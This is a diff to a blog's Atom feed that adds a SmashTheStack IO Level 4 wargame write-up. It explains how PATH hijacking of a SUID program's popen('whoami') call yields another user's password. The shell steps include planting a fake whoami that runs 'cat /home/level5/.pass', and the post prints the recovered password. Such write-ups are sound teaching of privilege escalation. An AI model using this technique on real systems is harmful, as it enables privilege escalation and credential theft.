@@ -4,7 +4,7 @@
   <title><![CDATA[Category: wargames | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/wargames/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-07-07T21:58:23+03:00</updated>
+  <updated>2014-07-17T20:01:27+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,151 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
+    <updated>2014-07-07T22:24:52+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
+    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>
+
+<!-- more -->
+
+
+<p>``` c
+//writen by bla</p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;stdio.h></h1>
+
+<p>int main() {</p>
+
+<pre><code>    char username[1024];
+    FILE* f = popen("whoami","r");
+    fgets(username, sizeof(username), f);
+    printf("Welcome %s", username);
+
+    return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<h4>Function overview</h4>
+
+<p><strong>popen</strong></p>
+
+<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>
+
+<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>
+
+<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>
+
+<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>
+
+<p>Note that output popen() streams are fully buffered by default.</p>
+
+<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>
+
+<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>
+
+<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>
+
+<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>
+
+<p><strong>fgets</strong></p>
+
+<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>
+
+<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>
+
+<p>On success, the function returns <em>str</em>.
+If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
+If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>
+
+<h4>Program description</h4>
+
+<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>
+
+<p><code>plain
+level4@io:/levels$ ./level04
+Welcome level5
+</code></p>
+
+<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>
+
+<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>
+
+<p><code>plain
+level4@io:/levels$ which whoami
+/usr/bin/whoami
+</code></p>
+
+<p>For this we have to understand the concept of PATH:</p>
+
+<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
+executable files in response to commands issued by a user.
+Each user on a system can have a different PATH variable.</p>
+
+<p>(The Linux Information Project)</p></blockquote>
+
+<p>To see the contents of our PATH variable, we do this:</p>
+
+<p><code>plain
+level4@io:/levels$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>
+
+<p>``` plain
+PATH=&ldquo;directory:$PATH&rdquo;</p>
+
+<p>PATH=$PATH:directory
+export PATH</p>
+
+<p>export PATH=$PATH:directory
+```</p>
+
+<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>
+
+<p><code>plain
+level4@io:/levels$ mkdir /tmp/mydir
+level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>
+
+<p><code>plain
+chmod 777 whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>Now add our directory to our PATH:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
+level4@io:/tmp/mydir$ echo $PATH
+/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ /levels/level04
+Welcome KGpWsju2vDpmxcxlvm
+</code></p>
+
+<blockquote><p>Work consists of whatever a body is obliged to do.
+Play consists of whatever a body is not obliged to do.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
